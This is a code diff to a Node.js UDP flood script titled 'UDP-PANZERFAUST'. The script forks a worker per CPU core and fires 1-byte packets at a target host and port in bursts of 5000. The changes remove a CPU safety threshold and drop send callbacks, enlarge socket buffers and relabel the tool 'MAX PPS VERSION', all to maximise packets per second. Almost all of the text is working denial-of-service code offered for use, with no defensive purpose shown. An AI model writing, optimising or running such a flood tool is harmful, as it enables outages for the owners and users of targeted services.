@@ -12,14 +12,12 @@ if (!target || isNaN(duration)) {
 }
 
 const endTime = Date.now() + duration * 1000;
-const payload = Buffer.alloc(1); // minimal payload = max PPS
+const payload = Buffer.alloc(1); // 1-byte payload for max PPS
 const cpuCount = os.cpus().length;
 
-const SAFE_CPU_THRESHOLD = 90;   // CPU % threshold to throttle
-const SAFE_MEM_THRESHOLD = 85;   // RAM % threshold to throttle
+const SAFE_MEM_THRESHOLD = 85; // RAM usage % before throttling
 
 function getCpuUsage() {
-  // Rough CPU usage snapshot for throttling (Linux-specific, cross-platform needs more work)
   const cpus = os.cpus();
   let idle = 0, total = 0;
   cpus.forEach(cpu => {
@@ -34,14 +32,13 @@ if (cluster.isMaster) {
   let maxPPS = 0;
 
   console.clear();
-  console.log('UDP-PANZERFAUST [PPS FOCUSED + SAFETY]');
+  console.log('UDP-PANZERFAUST [MAX PPS VERSION]');
   console.log('--------------------------------------');
   console.log(`Target: ${target}:${port}`);
   console.log(`Duration: ${duration}s`);
   console.log(`Cores: ${cpuCount}`);
   console.log('Launching...\n');
 
-  // Track CPU for throttling
   let cpuStart = getCpuUsage();
 
   for (let i = 0; i < cpuCount; i++) cluster.fork();
@@ -56,7 +53,6 @@ if (cluster.isMaster) {
   }
 
   setInterval(() => {
-    // Calculate CPU usage %
     const cpuEnd = getCpuUsage();
     const idleDiff = cpuEnd.idle - cpuStart.idle;
     const totalDiff = cpuEnd.total - cpuStart.total;
@@ -64,7 +60,7 @@ if (cluster.isMaster) {
     cpuStart = cpuEnd;
 
     console.clear();
-    console.log('UDP-PANZERFAUST [PPS FOCUSED + SAFETY]');
+    console.log('UDP-PANZERFAUST [MAX PPS VERSION]');
     console.log('--------------------------------------');
     console.log(`Total Packets Sent: ${totalSent.toLocaleString()}`);
     console.log(`Max PPS: ${maxPPS.toLocaleString()}`);
@@ -72,7 +68,6 @@ if (cluster.isMaster) {
     console.log(`Target: ${target}:${port}`);
     console.log('--------------------------------------');
 
-    // Reset maxPPS for next interval
     maxPPS = 0;
   }, 2000);
 
@@ -84,6 +79,10 @@ if (cluster.isMaster) {
 
 } else {
   const sock = dgram.createSocket('udp4');
+  sock.bind(() => {
+    sock.setSendBufferSize(2 * 1024 * 1024); // Increase socket buffer
+  });
+
   let sent = 0;
   let pps = 0;
   let isThrottled = false;
@@ -100,15 +99,13 @@ if (cluster.isMaster) {
       if (Date.now() > endTime) return;
 
       if (!isThrottled) {
-        for (let i = 0; i < 5000; i++) { // huge bursts for max PPS
-          sock.send(payload, 0, payload.length, port, target, () => {
-            sent++;
-            pps++;
-          });
+        for (let i = 0; i < 5000; i++) {
+          sock.send(payload, port, target); // No callback = faster
+          sent++;
+          pps++;
         }
-        setImmediate(sendLoop);
+        setTimeout(sendLoop, 0); // Yield without slowing
       } else {
-        // Throttled: slow down spam for 10s, then resume
         setTimeout(() => {
           isThrottled = false;
           sendLoop();
@@ -119,10 +116,8 @@ if (cluster.isMaster) {
     sendLoop();
   }
 
-  // Monitor system usage every 500ms and toggle throttling
   setInterval(() => {
     const memUsage = getMemoryUsagePercent();
-    // Note: CPU load is only checked in master; here just mem for safety
     if (!isThrottled && memUsage > SAFE_MEM_THRESHOLD) {
       isThrottled = true;
     }
